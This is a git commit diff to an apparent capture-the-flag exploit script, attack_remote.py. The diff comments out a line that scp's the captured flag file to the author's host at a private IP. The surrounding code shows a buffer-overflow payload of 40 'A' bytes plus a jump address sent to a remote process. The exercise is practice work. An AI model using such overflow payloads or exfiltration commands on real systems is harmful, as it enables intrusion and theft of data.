167c665a8375c7e9ca82233d054791016fe0690f
RobinHsieh <robin0623.hsieh@gmail.com>
2023-11-03 08:22:31 +0000

    update

--- 01_helloworld/attack_remote.py
+++ 01_helloworld/attack_remote.py
@@ -8,7 +8,7 @@ payload = b'A' * 40 + jump_to
 p.recvuntil("way!")
 p.send(payload)
 
-p.sendline("scp /home/$(whoami)/flag robinhsieh@172.24.0.106:/Users/robinhsieh/Programming/Python/CatchTheFlag/")
+# p.sendline("scp /home/$(whoami)/flag robinhsieh@172.24.0.106:/Users/robinhsieh/Programming/Python/CatchTheFlag/")
 
 p.interactive()
 
